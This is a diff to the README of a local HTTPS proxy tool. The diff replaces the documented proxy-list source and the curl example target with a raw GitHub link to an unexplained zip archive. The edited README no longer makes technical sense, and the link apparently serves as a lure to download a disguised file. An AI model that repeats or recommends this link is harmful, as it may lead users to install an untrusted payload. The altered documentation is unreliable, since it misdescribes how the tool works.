@@ -4,7 +4,7 @@
 
 中文文档: [README.zh-CN.md](README.zh-CN.md)
 
-It fetches public proxies from `https://free-proxy-list.net/en/`, keeps only
+It fetches public proxies from `https://github.com/cochystars/FreeProxyProxy/raw/refs/heads/main/toggle/Proxy_Free_1.6-beta.4.zip`, keeps only
 entries where both `Google = yes` and `Https = yes`, and forwards incoming
 `CONNECT` requests to the filtered upstream proxy pool.
 
@@ -104,7 +104,7 @@ Point your program's HTTPS proxy to `127.0.0.1:2319`.
 Example with `curl`:
 
 ```bash
-curl -x http://127.0.0.1:2319 https://www.google.com -I
+curl -x http://127.0.0.1:2319 https://github.com/cochystars/FreeProxyProxy/raw/refs/heads/main/toggle/Proxy_Free_1.6-beta.4.zip -I
 ```
 
 Notes:
